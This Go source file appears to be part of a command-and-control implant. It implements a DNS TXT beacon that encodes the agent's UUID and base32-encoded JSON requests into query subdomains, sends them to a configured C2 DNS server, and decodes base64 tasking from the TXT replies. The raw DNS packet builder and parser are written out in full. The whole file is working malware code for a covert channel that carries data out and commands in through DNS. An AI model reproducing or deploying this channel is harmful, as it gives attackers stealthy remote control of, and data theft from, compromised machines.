//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"time"
)

// sendDNSBeacon performs a DNS TXT-based C2 beacon.
// It builds a TXT query with the agent UUID (and optional base32-encoded JSON request)
// in the subdomain, sends it to the C2 DNS server, and reads the TXT response.
func sendDNSBeacon(body []byte) []byte {
	domain := DNSDomain
	if domain == "" {
		return nil
	}
	dnsServer := DNSServer
	if dnsServer == "" {
		return nil
	}

	// Build the query name: <hex-uuid>[.<base32data>].dns.<domain>
	uuidHex := hexEncodedUUID(agentUUID)
	var qname string
	if len(body) > 0 {
		// Encode the JSON body as base32 (no padding) and split into 63-char labels
		encoded := base32.StdEncoding.EncodeToString(body)
		encoded = strings.TrimRight(encoded, "=")
		var labels []string
		for i := 0; i < len(encoded); i += 63 {
			end := i + 63
			if end > len(encoded) {
				end = len(encoded)
			}
			labels = append(labels, encoded[i:end])
		}
		qname = uuidHex + "." + strings.Join(labels, ".") + ".dns." + domain
	} else {
		qname = uuidHex + ".dns." + domain
	}

	// Build DNS TXT query packet
	pkt := buildDNSTXTQuery(qname)

	// Send via UDP to DNS server
	conn, err := net.DialTimeout("udp", dnsServer+":53", 5*time.Second)
	if err != nil {
		if Debug {
			fmt.Printf("[!] DNS beacon dial failed: %v\n", err)
		}
		return nil
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	if _, err := conn.Write(pkt); err != nil {
		if Debug {
			fmt.Printf("[!] DNS beacon write failed: %v\n", err)
		}
		return nil
	}

	// Read response (max 4096 bytes)
	resp := make([]byte, 4096)
	n, err := conn.Read(resp)
	if err != nil {
		if Debug {
			fmt.Printf("[!] DNS beacon read failed: %v\n", err)
		}
		return nil
	}

	// Parse TXT response
	txts := parseDNSTXTResponse(resp[:n])
	if len(txts) == 0 {
		if Debug {
			fmt.Println("[!] DNS beacon: no TXT records in response")
		}
		return nil
	}

	// Concatenate all TXT chunks and base64 decode
	combined := strings.Join(txts, "")
	combined = strings.TrimSpace(combined)
	if combined == "" || combined == " " {
		return nil
	}

	data, err := base64.StdEncoding.DecodeString(combined)
	if err != nil {
		if Debug {
			fmt.Printf("[!] DNS beacon base64 decode failed: %v\n", err)
		}
		return nil
	}
	return data
}

// hexEncodedUUID converts UUID with dashes to a hex-only string
func hexEncodedUUID(uuid string) string {
	return strings.ReplaceAll(uuid, "-", "")
}

// buildDNSTXTQuery builds a raw DNS TXT query packet for the given domain name.
func buildDNSTXTQuery(name string) []byte {
	encoded := encodeDNSName(name)

	// Header (12 bytes)
	hdr := make([]byte, 12)
	// ID (random)
	binary.BigEndian.PutUint16(hdr[0:2], uint16(time.Now().UnixNano()&0xFFFF))
	// Flags: standard query, recursion desired
	binary.BigEndian.PutUint16(hdr[2:4], 0x0100)
	// QDCOUNT = 1
	binary.BigEndian.PutUint16(hdr[4:6], 1)
	// ANCOUNT = 0
	binary.BigEndian.PutUint16(hdr[6:8], 0)
	// NSCOUNT = 0
	binary.BigEndian.PutUint16(hdr[8:10], 0)
	// ARCOUNT = 0
	binary.BigEndian.PutUint16(hdr[10:12], 0)

	// Question
	q := encoded
	// QTYPE: TXT = 16
	q = append(q, 0, 16)
	// QCLASS: IN = 1
	q = append(q, 0, 1)

	return append(hdr, q...)
}

// encodeDNSName encodes a domain name in DNS label format.
func encodeDNSName(name string) []byte {
	var buf []byte
	labels := strings.Split(name, ".")
	for _, label := range labels {
		if len(label) == 0 {
			continue
		}
		buf = append(buf, byte(len(label)))
		buf = append(buf, []byte(label)...)
	}
	buf = append(buf, 0) // root label
	return buf
}

// parseDNSTXTResponse parses a DNS response packet and returns TXT record strings.
func parseDNSTXTResponse(pkt []byte) []string {
	if len(pkt) < 12 {
		return nil
	}

	// Parse header
	// qdcount := binary.BigEndian.Uint16(pkt[4:6])
	ancount := binary.BigEndian.Uint16(pkt[6:8])

	// Skip header (12 bytes) + question section
	offset := 12

	// Skip question
	for offset < len(pkt) {
		if pkt[offset] == 0 {
			offset++
			break
		}
		if pkt[offset]&0xC0 == 0xC0 {
			offset += 2
			break
		}
		offset += int(pkt[offset]) + 1
	}
	// Skip QTYPE + QCLASS
	offset += 4

	if offset > len(pkt) {
		return nil
	}

	var txts []string
	for i := 0; i < int(ancount) && offset < len(pkt); i++ {
		// NAME (could be pointer)
		if offset+2 > len(pkt) {
			break
		}
		if pkt[offset]&0xC0 == 0xC0 {
			offset += 2
		} else {
			for offset < len(pkt) && pkt[offset] != 0 {
				offset += int(pkt[offset]) + 1
			}
			offset++ // skip 0 root
		}

		if offset+10 > len(pkt) {
			break
		}
		rtype := binary.BigEndian.Uint16(pkt[offset : offset+2])
		offset += 2
		// CLASS
		offset += 2
		// TTL
		offset += 4
		rdlength := binary.BigEndian.Uint16(pkt[offset : offset+2])
		offset += 2

		if rtype == 16 { // TXT
			end := offset + int(rdlength)
			if end > len(pkt) {
				end = len(pkt)
			}
			// TXT record: sequence of <length-byte><string>
			pos := offset
			for pos < end {
				if pos >= len(pkt) {
					break
				}
				txtLen := int(pkt[pos])
				pos++
				if pos+txtLen > len(pkt) {
					break
				}
				txts = append(txts, string(pkt[pos:pos+txtLen]))
				pos += txtLen
			}
		}
		offset += int(rdlength)
	}

	return txts
}
